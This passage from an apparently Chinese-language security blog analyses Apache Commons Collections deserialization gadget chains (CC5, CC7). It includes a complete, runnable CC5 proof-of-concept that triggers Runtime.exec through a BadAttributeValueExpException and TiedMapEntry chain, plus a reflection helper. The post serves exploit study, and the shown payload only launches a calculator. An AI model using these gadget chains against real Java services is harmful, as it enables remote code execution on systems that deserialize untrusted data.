class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><blockquote><p>CommonsCollections 3.1 - 3.2.1</p><p>JDK 7u80 以上</p></blockquote><p>CC5和CC6的大部分都是一致的。不同的是CC5更换了调用 TiedMapEntry.getValue的方式。</p><h3 id="POC构造-2"><a href="#POC构造-2" class="headerlink" title="POC构造"></a>POC构造</h3><p>在<code>TiedMapEntry</code>之中其实还有一个地方调用其自身的 getValue 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getKey() + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-built_in">this</span>.getValue();<br>    &#125;<br></code></pre></td></tr></table></figure><p>在toString方法中调用getValue方法。这就意味着能调用到<code>TiedMapEntry.toString</code>也能与后面的链连接上。</p><p>CC5中使用的是<code>BadAttributeValueExpException</code>，其readObject中会调用其属性val的toString方法。所以只要将val设置为我们构造的 <code>TiedMapEntry</code>就完成了整个链的构建</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>            val = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Long<br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> Float<br>                || valObj <span class="hljs-keyword">instanceof</span> Double<br>                || valObj <span class="hljs-keyword">instanceof</span> Byte<br>                || valObj <span class="hljs-keyword">instanceof</span> Short<br>                || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>            val = valObj.toString();<span class="hljs-comment">//此处调用了toString方法</span><br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>但是值得注意的一点是<code>BadAttributeValueExpException</code>的构造方法是会处理传入参数的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> &#123;<br>        <span class="hljs-built_in">this</span>.val = val == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : val.toString();<br>    &#125;<br></code></pre></td></tr></table></figure><p>直接使用构造方法建立对象是不行的，需要使用反射将<code>LazyMap</code>注入进去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">unser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>tools.setValue(unser,<span class="hljs-string">&quot;val&quot;</span>,tide);<br></code></pre></td></tr></table></figure><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java">&gt;<span class="hljs-comment">//tools</span><br>&gt;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br>&gt;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">tools</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String name,Object value)</span> <span class="hljs-keyword">throws</span> IllegalAccessException &#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getField(name);<br>           field.set(obj,value);<br>       &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>               field.setAccessible(<span class="hljs-literal">true</span>);<br>               field.set(obj,value);<br>           &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(ex);<br>           &#125;<br>       &#125;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">(Object obj,String name)</span> <span class="hljs-keyword">throws</span> IllegalAccessException &#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getField(name);<br>           <span class="hljs-keyword">return</span> field.get(obj);<br>       &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>           <span class="hljs-keyword">try</span> &#123;<br>               <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>               field.setAccessible(<span class="hljs-literal">true</span>);<br>               <span class="hljs-keyword">return</span> field.get(obj);<br>           &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>               <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(ex);<br>           &#125;<br>       &#125;<br>   &#125;<br>&gt;&#125;<br><br></code></pre></td></tr></table></figure></blockquote><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">iner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span> LazyMap.decorate(iner,chainedTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tide</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outer,<span class="hljs-string">&quot;1&quot;</span>);<br><br>        <br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">unser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        tools.setValue(unser,<span class="hljs-string">&quot;val&quot;</span>,tide);<br><br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">File</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CC5.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(File);<br>        out.writeObject(unser);<br><br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CC5.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(ser);<br>        Object test=  in.readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730182041296.png" alt="image-20220730182041296"></p><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BadAttributeValueExpException</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><blockquote><p>CommonsCollections 3.1 - 3.2.1</p><p>JDK无限制</p></blockquote><p>CC7作为CommonsCollections 3下最后一个使用 InvokerTransformer相较于其他几个调用链理解起来略微困难一点。</p><h3 id="POC构造-3"><a href="#POC构造-3" class="headerlink" title="POC构造"></a>POC构造</h3><p>还是老规矩，LazyMap之后的链子没有发生变化，变化的还是触发LazyMap.get之前的部分</p><p>这是LazyMap继承自AbstractMapDecorator 的 equals 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-type">return</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span>= <span class="hljs-built_in">this</span> ? <span class="hljs-literal">true</span> : <span class="hljs-built_in">this</span>.map.equals(object);<br>    &#125;<br></code></pre></td></tr></table></figure><p>他会去调用装饰的Map的equals 方法。这里使用的HashMap，它从 AbstractMap 继承了一个 equals方法，其中会调用传入对象的 get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>        <span class="hljs-keyword">if</span> (m.size() != size())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>            <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>                Entry&lt;K,V&gt; e = i.next();<br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>                <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<span class="hljs-comment">//若传入的对象o为LazyMap就会调用它的get方法</span><br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (ClassCastException unused) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (NullPointerException unused) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>不难理解，这里需要一个两个LazyMap作equals判断的场景就可以触发这个调用链。</p><p>CC7里使用到的就是 Hashtable对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>         <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        <span class="hljs-comment">// Read in the length, threshold, and loadfactor</span><br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Read the original length of the array and number of elements</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">origlength</span> <span class="hljs-operator">=</span> s.readInt();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">elements</span> <span class="hljs-operator">=</span> s.readInt();<br><br>        <span class="hljs-comment">// Compute new size with a bit of room 5% to grow but</span><br>        <span class="hljs-comment">// no larger than the original size.  Make the length</span><br>        <span class="hljs-comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span><br>        <span class="hljs-comment">// Guard against the length ending up zero, that&#x27;s not valid.</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(elements * loadFactor) + (elements / <span class="hljs-number">20</span>) + <span class="hljs-number">3</span>;<br>        <span class="hljs-keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)<br>            length--;<br>        <span class="hljs-keyword">if</span> (origlength &gt; <span class="hljs-number">0</span> &amp;&amp; length &gt; origlength)<br>            length = origlength;<br>        table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>        threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>        count = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>            <span class="hljs-comment">// synch could be eliminated for performance</span><br>            reconstitutionPut(table, key, value);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br>        <span class="hljs-keyword">throws</span> StreamCorruptedException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>        <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>        <span class="hljs-comment">// This should not happen in deserialized version.</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// Creates the new entry.</span><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br>    &#125;<br></code></pre></td></tr></table></figure><p>Hashtable对象的 readObject 方法在复原对象的时候会依次复原每一对数据，复原数据是使用的<code>reconstitutionPut</code>函数，这个函数里会先通过 Hashtable自身计算index的方法获取一个index，然后通过这个index去获取一个Entry，再使用这个Entry去和传入的 key进行比较。</p><p>不研究细节地说就是要两个LazyMap的key的hash值相同。而LazyMap.get执行transform的条件有要求key值不能相同，所以需要寻找Hash碰撞。</p><blockquote><p>可以使用yy和 zZ。</p><p>其实String对象计算 hashCode的方法很简单，可以写一个小脚本爆破，很容易爆出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">&gt;<span class="hljs-comment">//String.hashCode()</span><br>&gt;<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>   <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> hash;<br>   <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>       <span class="hljs-type">char</span> val[] = value;<br><br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>           h = <span class="hljs-number">31</span> * h + val[i];<br>       &#125;<br>       hash = h;<br>   &#125;<br>   <span class="hljs-keyword">return</span> 